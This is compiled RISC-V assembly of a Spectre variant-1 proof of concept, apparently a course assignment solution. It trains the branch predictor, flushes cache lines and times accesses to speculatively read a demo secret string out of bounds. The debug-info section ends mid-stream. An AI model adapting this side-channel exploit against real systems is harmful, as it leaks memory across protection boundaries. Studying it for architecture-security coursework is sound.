	.file	"spectre.c"
	.option nopic
	.attribute arch, "rv64i2p1_m2p0_a2p1_f2p2_d2p2_c2p0_zicbom1p0_zicsr2p0_zifencei2p0"
	.attribute unaligned_access, 0
	.attribute stack_align, 16
	.text
.Ltext0:
	.cfi_sections	.debug_frame
	.file 0 "/Users/cannedbeans/sharedlinuxdir/cdol/429-assignment-solutions/assignment-3" "spectre.c"
	.globl	array1_size
	.section	.sdata,"aw"
	.align	2
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.word	16
	.globl	unused1
	.bss
	.align	3
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align	3
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align	3
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align	3
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align	3
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.sdata
	.align	3
	.type	secret, @object
	.size	secret, 8
secret:
	.dword	.LC0
	.globl	temp
	.section	.sbss,"aw",@nobits
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.align	1
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB3:
	.file 1 "spectre.c"
	.loc 1 35 32
	.cfi_startproc
	addi	sp,sp,-32
	.cfi_def_cfa_offset 32
	sd	ra,24(sp)
	sd	s0,16(sp)
	.cfi_offset 1, -8
	.cfi_offset 8, -16
	addi	s0,sp,32
	.cfi_def_cfa 8, 0
	sd	a0,-24(s0)
	.loc 1 36 9
	lui	a5,%hi(array1_size)
	lw	a5,%lo(array1_size)(a5)
	slli	a5,a5,32
	srli	a5,a5,32
	.loc 1 36 6
	ld	a4,-24(s0)
	bgeu	a4,a5,.L3
	.loc 1 37 26
	lui	a5,%hi(array1)
	addi	a4,a5,%lo(array1)
	ld	a5,-24(s0)
	add	a5,a4,a5
	lbu	a5,0(a5)
	sext.w	a5,a5
	.loc 1 37 30
	slliw	a5,a5,9
	sext.w	a5,a5
	.loc 1 37 19
	lui	a4,%hi(array2)
	addi	a4,a4,%lo(array2)
	add	a5,a4,a5
	lbu	a4,0(a5)
	.loc 1 37 10
	lui	a5,%hi(temp)
	lbu	a5,%lo(temp)(a5)
	and	a5,a4,a5
	andi	a4,a5,0xff
	lui	a5,%hi(temp)
	sb	a4,%lo(temp)(a5)
.L3:
	.loc 1 39 1
	nop
	ld	ra,24(sp)
	.cfi_restore 1
	ld	s0,16(sp)
	.cfi_restore 8
	.cfi_def_cfa 2, 32
	addi	sp,sp,32
	.cfi_def_cfa_offset 0
	jr	ra
	.cfi_endproc
.LFE3:
	.size	victim_function, .-victim_function
	.align	1
	.globl	cbo_flush
	.type	cbo_flush, @function
cbo_flush:
.LFB4:
	.loc 1 41 27
	.cfi_startproc
	addi	sp,sp,-32
	.cfi_def_cfa_offset 32
	sd	ra,24(sp)
	sd	s0,16(sp)
	.cfi_offset 1, -8
	.cfi_offset 8, -16
	addi	s0,sp,32
	.cfi_def_cfa 8, 0
	sd	a0,-24(s0)
	.loc 1 42 5
	ld	a5,-24(s0)
 #APP
# 42 "spectre.c" 1
	CBO.FLUSH 0(a5)

# 0 "" 2
	.loc 1 45 1
 #NO_APP
	nop
	ld	ra,24(sp)
	.cfi_restore 1
	ld	s0,16(sp)
	.cfi_restore 8
	.cfi_def_cfa 2, 32
	addi	sp,sp,32
	.cfi_def_cfa_offset 0
	jr	ra
	.cfi_endproc
.LFE4:
	.size	cbo_flush, .-cbo_flush
	.align	1
	.globl	rdcycle
	.type	rdcycle, @function
rdcycle:
.LFB5:
	.loc 1 47 20
	.cfi_startproc
	addi	sp,sp,-32
	.cfi_def_cfa_offset 32
	sd	ra,24(sp)
	sd	s0,16(sp)
	.cfi_offset 1, -8
	.cfi_offset 8, -16
	addi	s0,sp,32
	.cfi_def_cfa 8, 0
	.loc 1 49 5
 #APP
# 49 "spectre.c" 1
	RDCYCLE a5
# 0 "" 2
 #NO_APP
	sd	a5,-24(s0)
	.loc 1 50 12
	ld	a5,-24(s0)
	.loc 1 51 1
	mv	a0,a5
	ld	ra,24(sp)
	.cfi_restore 1
	ld	s0,16(sp)
	.cfi_restore 8
	.cfi_def_cfa 2, 32
	addi	sp,sp,32
	.cfi_def_cfa_offset 0
	jr	ra
	.cfi_endproc
.LFE5:
	.size	rdcycle, .-rdcycle
	.align	1
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB6:
	.loc 1 59 73
	.cfi_startproc
	addi	sp,sp,-144
	.cfi_def_cfa_offset 144
	sd	ra,136(sp)
	sd	s0,128(sp)
	sd	s1,120(sp)
	.cfi_offset 1, -8
	.cfi_offset 8, -16
	.cfi_offset 9, -24
	addi	s0,sp,144
	.cfi_def_cfa 8, 0
	sd	a0,-120(s0)
	sd	a1,-128(s0)
	sd	a2,-136(s0)
	.loc 1 63 7
	sw	zero,-36(s0)
	.loc 1 64 7
	li	a5,-1
	sw	a5,-40(s0)
	.loc 1 64 21
	li	a5,-1
	sw	a5,-44(s0)
.LBB2:
	.loc 1 65 12
	sw	zero,-48(s0)
	.loc 1 65 3
	j	.L8
.L9:
	.loc 1 66 16
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-48(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	sw	zero,0(a5)
	.loc 1 65 29 discriminator 3
	lw	a5,-48(s0)
	addiw	a5,a5,1
	sw	a5,-48(s0)
.L8:
	.loc 1 65 21 discriminator 1
	lw	a5,-48(s0)
	sext.w	a4,a5
	li	a5,255
	ble	a4,a5,.L9
.LBE2:
.LBB3:
	.loc 1 68 12
	li	a5,100
	sw	a5,-52(s0)
	.loc 1 68 3
	j	.L10
.L28:
.LBB4:
	.loc 1 70 14
	sw	zero,-56(s0)
	.loc 1 70 5
	j	.L11
.L12:
	.loc 1 71 27
	lw	a5,-56(s0)
	slliw	a5,a5,9
	sext.w	a4,a5
	.loc 1 71 17
	lui	a5,%hi(array2)
	addi	a5,a5,%lo(array2)
	add	a5,a4,a5
	.loc 1 71 7
	mv	a0,a5
	call	cbo_flush
	.loc 1 70 31 discriminator 3
	lw	a5,-56(s0)
	addiw	a5,a5,1
	sw	a5,-56(s0)
.L11:
	.loc 1 70 23 discriminator 1
	lw	a5,-56(s0)
	sext.w	a4,a5
	li	a5,255
	ble	a4,a5,.L12
.LBE4:
	.loc 1 74 24
	lw	a4,-52(s0)
	lui	a5,%hi(array1_size)
	lw	a5,%lo(array1_size)(a5)
	remuw	a5,a4,a5
	sext.w	a5,a5
	.loc 1 74 16
	slli	a5,a5,32
	srli	a5,a5,32
	sd	a5,-80(s0)
.LBB5:
	.loc 1 75 14
	li	a5,29
	sw	a5,-60(s0)
	.loc 1 75 5
	j	.L13
.L16:
	.loc 1 76 7
	lui	a5,%hi(array1_size)
	addi	a0,a5,%lo(array1_size)
	call	cbo_flush
.LBB6:
	.loc 1 77 25
	sw	zero,-108(s0)
	.loc 1 77 7
	j	.L14
.L15:
	.loc 1 77 42 discriminator 3
	lw	a5,-108(s0)
	sext.w	a5,a5
	addiw	a5,a5,1
	sext.w	a5,a5
	sw	a5,-108(s0)
.L14:
	.loc 1 77 34 discriminator 1
	lw	a5,-108(s0)
	sext.w	a4,a5
	li	a5,99
	ble	a4,a5,.L15
.LBE6:
	.loc 1 81 15
	lw	a5,-60(s0)
	mv	a4,a5
	sext.w	a3,a4
	li	a5,715829248
	addi	a5,a5,-1365
	mul	a5,a3,a5
	srli	a5,a5,32
	sraiw	a3,a4,31
	subw	a5,a5,a3
	mv	a3,a5
	mv	a5,a3
	slliw	a5,a5,1
	addw	a5,a5,a3
	slliw	a5,a5,1
	subw	a5,a4,a5
	sext.w	a5,a5
	.loc 1 81 20
	addiw	a5,a5,-1
	sext.w	a4,a5
	.loc 1 81 25
	li	a5,-65536
	and	a5,a4,a5
	sext.w	a5,a5
	.loc 1 81 9
	sd	a5,-104(s0)
	.loc 1 82 19
	ld	a5,-104(s0)
	srli	a5,a5,16
	.loc 1 82 9
	ld	a4,-104(s0)
	or	a5,a4,a5
	sd	a5,-104(s0)
	.loc 1 83 42
	ld	a4,-120(s0)
	ld	a5,-80(s0)
	xor	a4,a4,a5
	.loc 1 83 27
	ld	a5,-104(s0)
	and	a5,a4,a5
	.loc 1 83 9
	ld	a4,-80(s0)
	xor	a5,a4,a5
	sd	a5,-104(s0)
	.loc 1 86 7
	ld	a0,-104(s0)
	call	victim_function
	.loc 1 75 31 discriminator 2
	lw	a5,-60(s0)
	addiw	a5,a5,-1
	sw	a5,-60(s0)
.L13:
	.loc 1 75 24 discriminator 1
	lw	a5,-60(s0)
	sext.w	a5,a5
	bge	a5,zero,.L16
.LBE5:
.LBB7:
	.loc 1 90 14
	sw	zero,-64(s0)
	.loc 1 90 5
	j	.L17
.L19:
.LBB8:
	.loc 1 91 23
	lw	a5,-64(s0)
	mv	a4,a5
	li	a5,167
	mulw	a5,a4,a5
	sext.w	a5,a5
	.loc 1 91 30
	addiw	a5,a5,13
	sext.w	a5,a5
	.loc 1 91 11
	andi	a5,a5,255
	sw	a5,-84(s0)
	.loc 1 92 28
	lw	a5,-84(s0)
	slliw	a5,a5,9
	sext.w	a4,a5
	.loc 1 92 12
	lui	a5,%hi(array2)
	addi	a5,a5,%lo(array2)
	add	a5,a4,a5
	sd	a5,-96(s0)
	.loc 1 93 33
	call	rdcycle
	mv	s1,a0
	.loc 1 94 14
	ld	a5,-96(s0)
	lbu	a5,0(a5)
	andi	a5,a5,0xff
	.loc 1 94 12
	sw	a5,-36(s0)
	.loc 1 95 33
	call	rdcycle
	mv	a5,a0
	.loc 1 95 25 discriminator 1
	sub	s1,a5,s1
	.loc 1 96 10
	li	a5,80
	bgtu	s1,a5,.L18
	.loc 1 96 65 discriminator 1
	lw	a4,-52(s0)
	lui	a5,%hi(array1_size)
	lw	a5,%lo(array1_size)(a5)
	remuw	a5,a4,a5
	sext.w	a3,a5
	.loc 1 96 58 discriminator 1
	lui	a5,%hi(array1)
	addi	a4,a5,%lo(array1)
	slli	a5,a3,32
	srli	a5,a5,32
	add	a5,a4,a5
	lbu	a5,0(a5)
	sext.w	a5,a5
	.loc 1 96 40 discriminator 1
	lw	a4,-84(s0)
	sext.w	a4,a4
	beq	a4,a5,.L18
	.loc 1 97 16
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-84(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	lw	a5,0(a5)
	.loc 1 97 23
	addiw	a5,a5,1
	sext.w	a4,a5
	lui	a5,%hi(results.0)
	addi	a3,a5,%lo(results.0)
	lw	a5,-84(s0)
	slli	a5,a5,2
	add	a5,a3,a5
	sw	a4,0(a5)
.L18:
.LBE8:
	.loc 1 90 31 discriminator 2
	lw	a5,-64(s0)
	addiw	a5,a5,1
	sw	a5,-64(s0)
.L17:
	.loc 1 90 23 discriminator 1
	lw	a5,-64(s0)
	sext.w	a4,a5
	li	a5,255
	ble	a4,a5,.L19
.LBE7:
	.loc 1 102 23
	li	a5,-1
	sw	a5,-44(s0)
	.loc 1 102 13
	lw	a5,-44(s0)
	sw	a5,-40(s0)
.LBB9:
	.loc 1 103 14
	sw	zero,-68(s0)
	.loc 1 103 5
	j	.L20
.L25:
	.loc 1 104 10
	lw	a5,-40(s0)
	sext.w	a5,a5
	blt	a5,zero,.L21
	.loc 1 104 33 discriminator 1
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-68(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	lw	a4,0(a5)
	.loc 1 104 47 discriminator 1
	lui	a5,%hi(results.0)
	addi	a3,a5,%lo(results.0)
	lw	a5,-40(s0)
	slli	a5,a5,2
	add	a5,a3,a5
	lw	a5,0(a5)
	.loc 1 104 23 discriminator 1
	blt	a4,a5,.L22
.L21:
	.loc 1 105 17
	lw	a5,-40(s0)
	sw	a5,-44(s0)
	.loc 1 106 17
	lw	a5,-68(s0)
	sw	a5,-40(s0)
	j	.L23
.L22:
	.loc 1 107 17
	lw	a5,-44(s0)
	sext.w	a5,a5
	blt	a5,zero,.L24
	.loc 1 107 40 discriminator 1
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-68(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	lw	a4,0(a5)
	.loc 1 107 54 discriminator 1
	lui	a5,%hi(results.0)
	addi	a3,a5,%lo(results.0)
	lw	a5,-44(s0)
	slli	a5,a5,2
	add	a5,a3,a5
	lw	a5,0(a5)
	.loc 1 107 30 discriminator 1
	blt	a4,a5,.L23
.L24:
	.loc 1 108 17
	lw	a5,-68(s0)
	sw	a5,-44(s0)
.L23:
	.loc 1 103 31 discriminator 2
	lw	a5,-68(s0)
	addiw	a5,a5,1
	sw	a5,-68(s0)
.L20:
	.loc 1 103 23 discriminator 1
	lw	a5,-68(s0)
	sext.w	a4,a5
	li	a5,255
	ble	a4,a5,.L25
.LBE9:
	.loc 1 111 41
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-44(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	lw	a5,0(a5)
	.loc 1 111 26
	addiw	a5,a5,2
	sext.w	a5,a5
	slliw	a5,a5,1
	sext.w	a4,a5
	.loc 1 111 16
	lui	a5,%hi(results.0)
	addi	a3,a5,%lo(results.0)
	lw	a5,-40(s0)
	slli	a5,a5,2
	add	a5,a3,a5
	lw	a5,0(a5)
	.loc 1 111 8
	blt	a4,a5,.L26
	.loc 1 111 67 discriminator 1
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-40(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	lw	a4,0(a5)
	.loc 1 111 56 discriminator 1
	li	a5,2
	bne	a4,a5,.L27
	.loc 1 111 92 discriminator 2
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-44(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	lw	a5,0(a5)
	.loc 1 111 82 discriminator 2
	beq	a5,zero,.L26
.L27:
	.loc 1 68 41 discriminator 2
	lw	a5,-52(s0)
	addiw	a5,a5,-1
	sw	a5,-52(s0)
.L10:
	.loc 1 68 31 discriminator 1
	lw	a5,-52(s0)
	sext.w	a5,a5
	bgt	a5,zero,.L28
.L26:
.LBE3:
	.loc 1 115 10
	lui	a5,%hi(results.0)
	addi	a5,a5,%lo(results.0)
	lw	a5,0(a5)
	.loc 1 115 14
	lw	a4,-36(s0)
	xor	a5,a5,a4
	sext.w	a4,a5
	lui	a5,%hi(results.0)
	addi	a5,a5,%lo(results.0)
	sw	a4,0(a5)
	.loc 1 116 14
	lw	a5,-40(s0)
	andi	a4,a5,0xff
	.loc 1 116 12
	ld	a5,-128(s0)
	sb	a4,0(a5)
	.loc 1 117 21
	lui	a5,%hi(results.0)
	addi	a4,a5,%lo(results.0)
	lw	a5,-40(s0)
	slli	a5,a5,2
	add	a5,a4,a5
	lw	a4,0(a5)
	.loc 1 117 12
	ld	a5,-136(s0)
	sw	a4,0(a5)
	.loc 1 118 8
	ld	a5,-128(s0)
	addi	a5,a5,1
	.loc 1 118 14
	lw	a4,-44(s0)
	andi	a4,a4,0xff
	.loc 1 118 12
	sb	a4,0(a5)
	.loc 1 119 8
	ld	a5,-136(s0)
	addi	a5,a5,4
	.loc 1 119 21
	lui	a4,%hi(results.0)
	addi	a3,a4,%lo(results.0)
	lw	a4,-44(s0)
	slli	a4,a4,2
	add	a4,a3,a4
	lw	a4,0(a4)
	.loc 1 119 12
	sw	a4,0(a5)
	.loc 1 120 1
	nop
	ld	ra,136(sp)
	.cfi_restore 1
	ld	s0,128(sp)
	.cfi_restore 8
	.cfi_def_cfa 2, 144
	ld	s1,120(sp)
	.cfi_restore 9
	addi	sp,sp,144
	.cfi_def_cfa_offset 0
	jr	ra
	.cfi_endproc
.LFE6:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align	3
.LC1:
	.string	"%p"
	.align	3
.LC2:
	.string	"%d"
	.align	3
.LC3:
	.string	"Reading %d bytes:\n"
	.align	3
.LC4:
	.string	"Reading at malicious_x = %p... "
	.align	3
.LC5:
	.string	"Success"
	.align	3
.LC6:
	.string	"Unclear"
	.align	3
.LC7:
	.string	"%s: "
	.align	3
.LC8:
	.string	"0x%02X='%c' score=%d "
	.align	3
.LC9:
	.string	"(second best: 0x%02X score=%d)"
	.text
	.align	1
	.globl	main
	.type	main, @function
main:
.LFB7:
	.loc 1 122 39
	.cfi_startproc
	addi	sp,sp,-64
	.cfi_def_cfa_offset 64
	sd	ra,56(sp)
	sd	s0,48(sp)
	.cfi_offset 1, -8
	.cfi_offset 8, -16
	addi	s0,sp,64
	.cfi_def_cfa 8, 0
	mv	a5,a0
	sd	a1,-64(s0)
	sw	a5,-52(s0)
	.loc 1 123 40
	lui	a5,%hi(secret)
	ld	a4,%lo(secret)(a5)
	lui	a5,%hi(array1)
	addi	a5,a5,%lo(array1)
	sub	a5,a4,a5
	.loc 1 123 10
	sd	a5,-32(s0)
	.loc 1 124 20
	li	a5,40
	sw	a5,-44(s0)
	.loc 1 127 10
	sw	zero,-20(s0)
	.loc 1 127 3
	j	.L30
.L31:
	.loc 1 128 15
	lui	a5,%hi(array2)
	addi	a4,a5,%lo(array2)
	lw	a5,-20(s0)
	add	a5,a4,a5
	li	a4,1
	sb	a4,0(a5)
	.loc 1 127 36 discriminator 3
	lw	a5,-20(s0)
	addiw	a5,a5,1
	sw	a5,-20(s0)
.L30:
	.loc 1 127 17 discriminator 1
	lw	a4,-20(s0)
	li	a5,131072
	bltu	a4,a5,.L31
	.loc 1 130 6
	lw	a5,-52(s0)
	sext.w	a4,a5
	li	a5,3
	bne	a4,a5,.L32
	.loc 1 131 16
	ld	a5,-64(s0)
	addi	a5,a5,8
	.loc 1 131 5
	ld	a4,0(a5)
	addi	a5,s0,-32
	mv	a2,a5
	lui	a5,%hi(.LC1)
	addi	a1,a5,%lo(.LC1)
	mv	a0,a4
	call	sscanf
	.loc 1 132 17
	ld	a4,-32(s0)
	.loc 1 132 20
	lui	a5,%hi(array1)
	addi	a5,a5,%lo(array1)
	.loc 1 132 17
	sub	a5,a4,a5
	sd	a5,-32(s0)
	.loc 1 133 16
	ld	a5,-64(s0)
	addi	a5,a5,16
	.loc 1 133 5
	ld	a4,0(a5)
	addi	a5,s0,-44
	mv	a2,a5
	lui	a5,%hi(.LC2)
	addi	a1,a5,%lo(.LC2)
	mv	a0,a4
	call	sscanf
.L32:
	.loc 1 136 3
	lw	a5,-44(s0)
	mv	a1,a5
	lui	a5,%hi(.LC3)
	addi	a0,a5,%lo(.LC3)
	call	printf
	.loc 1 137 9
	j	.L33
.L39:
	.loc 1 138 5
	ld	a5,-32(s0)
	mv	a1,a5
	lui	a5,%hi(.LC4)
	addi	a0,a5,%lo(.LC4)
	call	printf
	.loc 1 139 5
	ld	a5,-32(s0)
	addi	a4,a5,1
	sd	a4,-32(s0)
	addi	a3,s0,-40
	addi	a4,s0,-48
	mv	a2,a3
	mv	a1,a4
	mv	a0,a5
	call	readMemoryByte
	.loc 1 140 26
	lw	a4,-40(s0)
	.loc 1 140 42
	lw	a5,-36(s0)
	.loc 1 140 35
	slliw	a5,a5,1
	sext.w	a5,a5
	.loc 1 140 5
	blt	a4,a5,.L34
	.loc 1 140 5 is_stmt 0 discriminator 1
	lui	a5,%hi(.LC5)
	addi	a5,a5,%lo(.LC5)
	j	.L35
.L34:
	.loc 1 140 5 discriminator 2
	lui	a5,%hi(.LC6)
	addi	a5,a5,%lo(.LC6)
.L35:
	.loc 1 140 5 discriminator 4
	mv	a1,a5
	lui	a5,%hi(.LC7)
	addi	a0,a5,%lo(.LC7)
	call	printf
	.loc 1 141 42 is_stmt 1
	lbu	a5,-48(s0)
	.loc 1 141 5
	sext.w	a4,a5
	.loc 1 142 13
	lbu	a5,-48(s0)
	.loc 1 141 5
	mv	a3,a5
	li	a5,31
	bleu	a3,a5,.L36
	.loc 1 142 30
	lbu	a5,-48(s0)
	.loc 1 142 22
	mv	a3,a5
	li	a5,126
	bgtu	a3,a5,.L36
	.loc 1 142 47 discriminator 1
	lbu	a5,-48(s0)
	.loc 1 141 5
	sext.w	a5,a5
	j	.L37
.L36:
	.loc 1 141 5 is_stmt 0 discriminator 1
	li	a5,63
.L37:
	.loc 1 141 5 discriminator 3
	lw	a3,-40(s0)
	mv	a2,a5
	mv	a1,a4
	lui	a5,%hi(.LC8)
	addi	a0,a5,%lo(.LC8)
	call	printf
	.loc 1 143 14 is_stmt 1
	lw	a5,-36(s0)
	.loc 1 143 8
	ble	a5,zero,.L38
	.loc 1 144 53
	lbu	a5,-47(s0)
	.loc 1 144 7
	sext.w	a5,a5
	lw	a4,-36(s0)
	mv	a2,a4
	mv	a1,a5
	lui	a5,%hi(.LC9)
	addi	a0,a5,%lo(.LC9)
	call	printf
.L38:
	.loc 1 146 5
	li	a0,10
	call	putchar
.L33:
	.loc 1 137 10
	lw	a5,-44(s0)
	addiw	a5,a5,-1
	sext.w	a5,a5
	.loc 1 137 16
	sw	a5,-44(s0)
	.loc 1 137 10
	lw	a5,-44(s0)
	.loc 1 137 16
	bge	a5,zero,.L39
	.loc 1 148 10
	li	a5,0
	.loc 1 149 1
	mv	a0,a5
	ld	ra,56(sp)
	.cfi_restore 1
	ld	s0,48(sp)
	.cfi_restore 8
	.cfi_def_cfa 2, 64
	addi	sp,sp,64
	.cfi_def_cfa_offset 0
	jr	ra
	.cfi_endproc
.LFE7:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,8
.Letext0:
	.file 2 "/opt/homebrew/Cellar/riscv-gnu-toolchain/main/riscv64-unknown-elf/include/machine/_default_types.h"
	.file 3 "/opt/homebrew/Cellar/riscv-gnu-toolchain/main/lib/gcc/riscv64-unknown-elf/14.2.0/include/stddef.h"
	.file 4 "/opt/homebrew/Cellar/riscv-gnu-toolchain/main/riscv64-unknown-elf/include/sys/_stdint.h"
	.file 5 "/opt/homebrew/Cellar/riscv-gnu-toolchain/main/riscv64-unknown-elf/include/stdio.h"
	.section	.debug_info,"",@progbits
.Ldebug_info0:
	.4byte	0x4ee
	.2byte	0x5
	.byte	0x1
	.byte	0x8
	.4byte	.Ldebug_abbrev0
	.uleb128 0x11
	.4byte	.LASF46
	.byte	0x1d
	.4byte	.LASF0
	.4byte	.LASF1
	.8byte	.Ltext0
	.8byte	.Letext0-.Ltext0
	.4byte	.Ldebug_line0
	.uleb128 0x2
	.byte	0x1
	.byte	0x6
	.4byte	.LASF2
	.uleb128 0x7
	.4byte	.LASF8
	.byte	0x2
	.byte	0x2b
	.byte	0x18
	.4byte	0x41
	.uleb128 0x2
	.byte	0x1
	.byte	0x8
	.4byte	.LASF3
	.uleb128 0x2
	.byte	0x2
	.byte	0x5
	.4byte	.LASF4
	.uleb128 0x2
	.byte	0x2
	.byte	0x7
	.4byte	.LASF5
	.uleb128 0x12
	.byte	0x4
	.byte	0x5
	.string	"int"
	.uleb128 0xd
	.4byte	0x56
	.uleb128 0x2
	.byte	0x4
	.byte	0x7
	.4byte	.LASF6
	.uleb128 0x2
	.byte	0x8
	.byte	0x5
	.4byte	.LASF7
	.uleb128 0x7
	.4byte	.LASF9
	.byte	0x2
	.byte	0x69
	.byte	0x19
	.4byte	0x7c
	.uleb128 0x2
	.byte	0x8
	.byte	0x7
	.4byte	.LASF10
	.uleb128 0x7
	.4byte	.LASF11
	.byte	0x3
	.byte	0xd6
	.byte	0x17
	.4byte	0x7c
	.uleb128 0x2
	.byte	0x8
	.byte	0x5
	.4byte	.LASF12
	.uleb128 0x2
	.byte	0x10
	.byte	0x4
	.4byte	.LASF13
	.uleb128 0x13
	.byte	0x8
	.uleb128 0x5
	.4byte	0xa4
	.uleb128 0x2
	.byte	0x1
	.byte	0x8
	.4byte	.LASF14
	.uleb128 0x14
	.4byte	0xa4
	.uleb128 0x5
	.4byte	0xab
	.uleb128 0x2
	.byte	0x8
	.byte	0x7
	.4byte	.LASF15
	.uleb128 0x7
	.4byte	.LASF16
	.byte	0x4
	.byte	0x18
	.byte	0x13
	.4byte	0x35
	.uleb128 0xd
	.4byte	0xbc
	.uleb128 0x7
	.4byte	.LASF17
	.byte	0x4
	.byte	0x3c
	.byte	0x14
	.4byte	0x70
	.uleb128 0x4
	.4byte	.LASF18
	.byte	0x8
	.byte	0xe
	.4byte	0x62
	.uleb128 0x9
	.byte	0x3
	.8byte	array1_size
	.uleb128 0x6
	.4byte	0xbc
	.4byte	0xfe
	.uleb128 0x8
	.4byte	0x7c
	.byte	0x3f
	.byte	0
	.uleb128 0x4
	.4byte	.LASF19
	.byte	0x9
	.byte	0x9
	.4byte	0xee
	.uleb128 0x9
	.byte	0x3
	.8byte	unused1
	.uleb128 0x6
	.4byte	0xbc
	.4byte	0x123
	.uleb128 0x8
	.4byte	0x7c
	.byte	0x9f
	.byte	0
	.uleb128 0x4
	.4byte	.LASF20
	.byte	0xa
	.byte	0x9
	.4byte	0x113
	.uleb128 0x9
	.byte	0x3
	.8byte	array1
	.uleb128 0x4
	.4byte	.LASF21
	.byte	0x1c
	.byte	0x9
	.4byte	0xee
	.uleb128 0x9
	.byte	0x3
	.8byte	unused2
	.uleb128 0x6
	.4byte	0xbc
	.4byte	0x160
	.uleb128 0x15
	.4byte	0x7c
	.4byte	0x1ffff
	.byte	0
	.uleb128 0x4
	.4byte	.LASF22
	.byte	0x1d
	.byte	0x9
	.4byte	0x14d
	.uleb128 0x9
	.byte	0x3
	.8byte	array2
	.uleb128 0x4
	.4byte	.LASF23
	.byte	0x1f
	.byte	0x7
	.4byte	0x9f
	.uleb128 0x9
	.byte	0x3
	.8byte	secret
	.uleb128 0x4
	.4byte	.LASF24
	.byte	0x21
	.byte	0x9
	.4byte	0xbc
	.uleb128 0x9
	.byte	0x3
	.8byte	temp
	.uleb128 0xe
	.4byte	.LASF25
	.byte	0xce
	.4byte	0x56
	.4byte	0x1b4
	.uleb128 0xc
	.4byte	0xb0
	.uleb128 0xf
	.byte	0
	.uleb128 0xe
	.4byte	.LASF26
	.byte	0xd2
	.4byte	0x56
	.4byte	0x1ce
	.uleb128 0xc
	.4byte	0xb0
	.uleb128 0xc
	.4byte	0xb0
	.uleb128 0xf
	.byte	0
	.uleb128 0x16
	.4byte	.LASF47
	.byte	0x1
	.byte	0x7a
	.byte	0x5
	.4byte	0x56
	.8byte	.LFB7
	.8byte	.LFE7-.LFB7
	.uleb128 0x1
	.byte	0x9c
	.4byte	0x251
	.uleb128 0x9
	.4byte	.LASF27
	.byte	0x7a
	.byte	0xe
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -52
	.uleb128 0x9
	.4byte	.LASF28
	.byte	0x7a
	.byte	0x21
	.4byte	0x251
	.uleb128 0x2
	.byte	0x91
	.sleb128 -64
	.uleb128 0x1
	.4byte	.LASF29
	.byte	0x7b
	.byte	0xa
	.4byte	0x83
	.uleb128 0x2
	.byte	0x91
	.sleb128 -32
	.uleb128 0x3
	.string	"i"
	.byte	0x7c
	.byte	0x7
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -20
	.uleb128 0x1
	.4byte	.LASF30
	.byte	0x7c
	.byte	0xa
	.4byte	0x256
	.uleb128 0x2
	.byte	0x91
	.sleb128 -40
	.uleb128 0x3
	.string	"len"
	.byte	0x7c
	.byte	0x14
	.4byte	0x56
	.uleb128 0x2
	.byte	0x91
	.sleb128 -44
	.uleb128 0x1
	.4byte	.LASF31
	.byte	0x7d
	.byte	0xb
	.4byte	0x266
	.uleb128 0x2
	.byte	0x91
	.sleb128 -48
	.byte	0
	.uleb128 0x5
	.4byte	0xb0
	.uleb128 0x6
	.4byte	0x56
	.4byte	0x266
	.uleb128 0x8
	.4byte	0x7c
	.byte	0x1
	.byte	0
	.uleb128 0x6
	.4byte	0xbc
	.4byte	0x276
	.uleb128 0x8
	.4byte	0x7c
	.byte	0x1
	.byte	0
	.uleb128 0x17
	.4byte	.LASF42
	.byte	0x1
	.byte	0x3b
	.byte	0x6
	.8byte	.LFB6
	.8byte	.LFE6-.LFB6
	.uleb128 0x1
	.byte	0x9c
	.4byte	0x44d
	.uleb128 0x9
	.4byte	.LASF29
	.byte	0x3b
	.byte	0x1c
	.4byte	0x83
	.uleb128 0x3
	.byte	0x91
	.sleb128 -120
	.uleb128 0x9
	.4byte	.LASF31
	.byte	0x3b
	.byte	0x31
	.4byte	0x44d
	.uleb128 0x3
	.byte	0x91
	.sleb128 -128
	.uleb128 0x9
	.4byte	.LASF30
	.byte	0x3b
	.byte	0x3f
	.4byte	0x452
	.uleb128 0x3
	.byte	0x91
	.sleb128 -136
	.uleb128 0x1
	.4byte	.LASF32
	.byte	0x3c
	.byte	0xe
	.4byte	0x457
	.uleb128 0x9
	.byte	0x3
	.8byte	results.0
	.uleb128 0x1
	.4byte	.LASF33
	.byte	0x3d
	.byte	0xa
	.4byte	0x83
	.uleb128 0x3
	.byte	0x91
	.sleb128 -80
	.uleb128 0x3
	.string	"x"
	.byte	0x3d
	.byte	0x16
	.4byte	0x83
	.uleb128 0x3
	.byte	0x91
	.sleb128 -104
	.uleb128 0x1
	.4byte	.LASF34
	.byte	0x3e
	.byte	0x15
	.4byte	0x467
	.uleb128 0x3
	.byte	0x91
	.sleb128 -96
	.uleb128 0x1
	.4byte	.LASF35
	.byte	0x3f
	.byte	0x7
	.4byte	0x56
